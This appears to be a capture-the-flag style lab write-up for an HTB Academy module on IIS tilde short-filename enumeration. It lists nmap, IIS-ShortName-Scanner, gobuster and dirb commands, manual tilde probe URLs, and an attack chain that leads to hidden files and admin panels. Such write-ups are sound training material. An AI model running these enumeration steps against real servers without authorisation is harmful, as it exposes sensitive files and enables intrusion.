# 🔍 IIS Tilde Enumeration

> **🎯 Objective:** Exploit IIS short filename vulnerability to discover hidden files and directories using 8.3 format enumeration.

## Overview

**IIS Tilde Enumeration** exploits a vulnerability in Microsoft IIS servers where **8.3 short filenames** can be discovered using the **tilde (~) character**. This technique reveals hidden files and directories that may not be accessible through normal browsing.

---

## HTB Academy Lab Solution

### Lab: Full Filename Discovery
**Question:** "What is the full .aspx filename that Gobuster identified?"

#### Step 1: Service Discovery
```bash
# Nmap scan to identify IIS
nmap -p- -sV -sC --open TARGET

# Expected result: Microsoft IIS httpd 7.5 on port 80
```

#### Step 2: Tilde Enumeration
```bash
# Download IIS-ShortName-Scanner
# https://github.com/lijiejie/IIS_shortname_Scanner

# Run automated tilde enumeration
java -jar iis_shortname_scanner.jar 0 5 http://TARGET/

# Expected findings:
# - ASPNET~1 (directory)
# - UPLOAD~1 (directory)  
# - TRANSF~1.ASP (file)
```

#### Step 3: Wordlist Generation
```bash
# Create custom wordlist for "transf" prefix
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt
```

#### Step 4: Full Filename Discovery
```bash
# Use Gobuster with custom wordlist
gobuster dir -u http://TARGET/ -w /tmp/list.txt -x .aspx,.asp

# Expected result: Full .aspx filename discovered
```

**Expected Answer:** Full filename starting with "transf" with .aspx extension *(extract from Gobuster output)*

---

## Technical Details

### 8.3 Short Filename Format
```bash
# Windows generates short names for files/directories
# Format: 8 characters + . + 3 characters
# Examples:
# - SecretDocuments → SECRET~1
# - transfer.aspx → TRANSF~1.ASP
```

### Enumeration Process
```bash
# Manual character-by-character discovery
http://example.com/~a
http://example.com/~b
http://example.com/~s    # 200 OK = valid
http://example.com/~se   # 200 OK = valid  
http://example.com/~sec  # 200 OK = valid
```

### Vulnerable IIS Versions
- **IIS 7.5** and earlier versions
- **Windows Server 2008** and older
- Servers with **8.3 filename generation** enabled

---

## Attack Methodology

### 1. Automated Discovery
```bash
# IIS-ShortName-Scanner (Java tool)
java -jar iis_shortname_scanner.jar 0 5 http://target/

# Python alternative
python iis_shortname_scan.py http://target/
```

### 2. Custom Wordlist Creation
```bash
# Generate targeted wordlists based on discovered prefixes
grep -r ^prefix /usr/share/wordlists/* > custom_list.txt
```

### 3. Full Name Brute Force
```bash
# Gobuster with discovered short names
gobuster dir -u http://target/ -w wordlist.txt -x .asp,.aspx,.txt,.pdf

# Dirb alternative
dirb http://target/ wordlist.txt -X .asp,.aspx
```

---

## Impact & Findings

**Common Discoveries:**
- 📁 **Hidden directories** (admin panels, backup folders)
- 📄 **Sensitive files** (config files, source code)
- 🔧 **Development resources** (test pages, debug info)
- 📝 **Documentation** (internal docs, manuals)

**Attack Chain:**
1. **Short name discovery** → Identify hidden resources
2. **Full name enumeration** → Access complete filenames
3. **Content analysis** → Extract sensitive information
4. **Further exploitation** → Use discovered resources for deeper access

**💡 Pro Tip:** IIS Tilde Enumeration is particularly effective against legacy Windows servers and can reveal administrative interfaces, backup files, and development resources not visible through standard directory enumeration. 